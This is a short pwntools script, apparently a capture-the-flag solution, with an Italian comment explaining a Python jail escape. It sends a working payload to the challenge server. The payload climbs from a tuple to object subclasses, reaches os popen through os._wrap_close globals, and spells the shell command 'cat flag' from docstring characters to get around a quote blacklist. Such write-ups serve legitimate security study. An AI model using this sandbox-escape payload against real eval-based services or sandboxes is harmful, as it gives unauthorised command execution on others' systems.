from pwn import *
'''
Nella challenge viene proposta una pyjail in cui nemmeno i builtins di python sono accessibili (se non per help), di conseguenza è necessario trovare un altro modo
per poter stampare il contenuto del file flag. Un modo per accedere alle funzioni non importate direttamente è quello di sfruttare l'inheritance delle classi, partendo
cioè da un oggetto di una classe accessibile, in questo caso una tupla (), per arrivare alla classe object (di cui tutti gli oggetti fanno parte), dalla classe object poi
con il metodo subclasses() possiamo trovare tutte le classe che ereditano da object, di queste ci interessa os.wrap_close, che permette di eseguire la funzione popen
e quindi di eseguire un comando nella shell, in questo caso il comando è 'cat flag' scritto sfruttando la stringa ricevuta da ().__doc__ perchè le virgolette sono blacklistate.
una volta eseguito il comando popen('cat flag) il risultato sarebbe un oggetto os._wrap_close e per leggerne il contenuto usiamo il metodo read()
link utili: 
https://blog.pepsipu.com/posts/albatross-redpwnctf
https://book.hacktricks.xyz/v/it/generic-methodologies-and-resources/python/bypass-python-sandboxes
'''


r = remote("sandbox_v2.challs.olicyber.it", 35004)

r.sendline("().__class__.__base__.__subclasses__()[-63].__init__.__globals__[().__doc__[84]+().__doc__[34]+().__doc__[84]+().__doc__[17]+().__doc__[7]](().__doc__[25]+().__doc__[14]+().__doc__[4]+().__doc__[8]+().__doc__[31]+().__doc__[3]+().__doc__[14]+().__doc__[38]).read()")
r.interactive()

r.close()